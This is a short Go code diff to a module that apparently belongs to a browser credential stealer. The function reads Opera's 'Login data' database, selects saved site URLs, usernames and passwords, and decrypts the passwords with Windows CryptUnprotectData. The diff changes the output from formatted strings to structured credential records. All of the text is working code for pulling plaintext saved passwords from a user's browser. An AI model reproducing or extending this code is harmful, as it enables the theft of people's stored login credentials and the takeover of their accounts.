@@ -15,7 +15,7 @@ var (
 	temporaryDbName = common.RandStringRunes(10)
 )
 
-func OperaModuleStart(path string) ([]string, bool){
+func OperaModuleStart(path string) ([]common.CredentialsData, bool){
 	if _, err := os.Stat(path); err == nil {
 		dbPath := fmt.Sprintf("%s\\Login data", path)
 
@@ -33,11 +33,12 @@ func OperaModuleStart(path string) ([]string, bool){
 		}
 		rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
 		var actionUrl, username, password string
-		var data []string
+		var data []common.CredentialsData
 		for rows.Next(){
 			rows.Scan(&actionUrl, &username, &password)
 			//fmt.Printf("%s %s - %s", actionUrl, username, common.Win32CryptUnprotectData(password, false))
-			data = append(data, fmt.Sprintf("%s %s %s", actionUrl, username, common.Win32CryptUnprotectData(password, false)))
+			//data = append(data, fmt.Sprintf("%s %s %s", actionUrl, username, common.Win32CryptUnprotectData(password, false))
+			data = append(data, common.CredentialsData{actionUrl, username, common.Win32CryptUnprotectData(password, false)})
 		}
 		return data, true
 	}
